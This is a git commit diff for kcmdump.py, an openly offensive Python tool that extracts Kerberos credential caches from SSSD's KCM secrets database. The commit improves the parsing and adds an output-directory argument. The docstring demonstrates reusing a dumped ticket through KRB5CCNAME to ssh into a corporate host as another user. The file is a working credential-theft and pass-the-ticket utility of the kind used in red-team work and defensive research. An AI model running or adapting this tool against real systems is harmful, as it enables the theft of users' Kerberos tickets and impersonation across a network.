205871b903b8035678f49f2a183df8b84c31cce2
aevy-syn <matthieu.barjole+github@synacktiv.com>
2025-12-31 13:09:30 +0100

    improve kcm ccache parsing + add output directory argument

--- kcmdump.py
+++ kcmdump.py
@@ -2,12 +2,12 @@
 
 """
 $ apt install python3-construct python3-ldb
-$ python3 kcmdump.py /var/lib/sss/secrets/secrets.ldb
-$ ls -lh
+$ python3 kcmdump.py /var/lib/sss/secrets/secrets.ldb out
+$ ls -lh out/
 -rw-r--r--. 1 root root 1.3K Jan 1 00:00 user_0.ccache
--rw-r--r--. 1 root root 1.8K Jan 1 00:00 kcmdump.py
-$ KRB5CCNAME=user_0.ccache klist
-$ KRB5CCNAME=user_0.ccache ssh user@corp.local@target.corp.local
+-rw-r--r--. 1 root root 1.3K Jan 1 00:00 user_1.ccache
+$ KRB5CCNAME=out/user_0.ccache klist
+$ KRB5CCNAME=out/user_0.ccache ssh user@corp.local@target.corp.local
 
 References:
 - https://sssd.io/release-notes/sssd-2.0.0.html
@@ -18,9 +18,10 @@ References:
 """
 
 from argparse import ArgumentParser
+from pathlib import Path
 from struct import pack
 
-from construct import Struct, this, Byte, Bytes, Int8ul, Int32ul, Array, PascalString
+from construct import Struct, this, Byte, Bytes, Int8ul, Int32ul, Array, PascalString, If
 from ldb import Ldb
 
 KCM_BASEDN = 'cn=kcm'
@@ -39,46 +40,60 @@ KCMCCache = Struct(
     'principal_presence' / Int8ul,
     'realm' / PascalString(Int32ul, 'utf-8'),
     'type' / Int32ul,
-    'principals_len' / Int32ul,
-    'principals' / Array(this.principals_len, PascalString(Int32ul, 'utf-8')),
-    'creds_len' / Int32ul,
-    'creds' / Array(this.creds_len, Cred)
+    'data' / If((this.principal_presence == 1),
+        Struct(
+            'principals_len' / Int32ul,
+            'principals' / Array(this.principals_len, PascalString(Int32ul, 'utf-8')),
+            'creds_len' / Int32ul,
+            'creds' / Array(this.creds_len, Cred)
+    ))
 )
 
 
-def dump(database):
+def dump(database, output):
 
     db = Ldb(database)
     containers = db.search(base=KCM_BASEDN, expression='type=container', attrs=['dn']).msgs
+
+    output = Path(output)
+    output.mkdir(exist_ok=True)
 
     for i, container in enumerate(containers):
         secrets = db.search(container.dn, expression='secret=*', attrs=['secret']).msgs
 
         for j, secret in enumerate(secrets):
             secret = secret['secret'].get(0)
-            kcm_cc = KCMCCache.parse(secret)
+            try:
+                kcm_cc = KCMCCache.parse(secret)
+            except:
+                print(f'error: could not parse secret {j}')
+                continue
 
-            with open(f'{kcm_cc.principals[0]}_{i*j+j}.ccache', 'wb') as ccache:
+            if not kcm_cc.data:
+                continue
+
+            with open(output / f'{kcm_cc.data.principals[0]}_{i*j+j}.ccache', 'wb') as ccache:
 
                 # 1. Header
                 ccache.write(bytes.fromhex(CCACHE_HEADER))
 
                 # 2. Default principal
                 ccache.write(pack('>I', kcm_cc.type))
-                ccache.write(pack('>I', kcm_cc.principals_len))
+                ccache.write(pack('>I', kcm_cc.data.principals_len))
                 ccache.write(pack('>I', len(kcm_cc.realm)))
                 ccache.write(kcm_cc.realm.encode())
-                for principal in kcm_cc.principals:
+                for principal in kcm_cc.data.principals:
                     ccache.write(pack('>I', len(principal)))
                     ccache.write(principal.encode())
 
                 # 3. Credentials
-                for cred in kcm_cc.creds:
+                for cred in kcm_cc.data.creds:
                     ccache.write(cred.blob)
 
 
 if __name__ == '__main__':
     parser = ArgumentParser(description='KCM Dumper')
     parser.add_argument('database', help='path to the KCM secrets database')
+    parser.add_argument('output', nargs='?', default='.', help='path to the output folder')
     args = parser.parse_args()
-    dump(args.database)
+    dump(args.database, args.output)
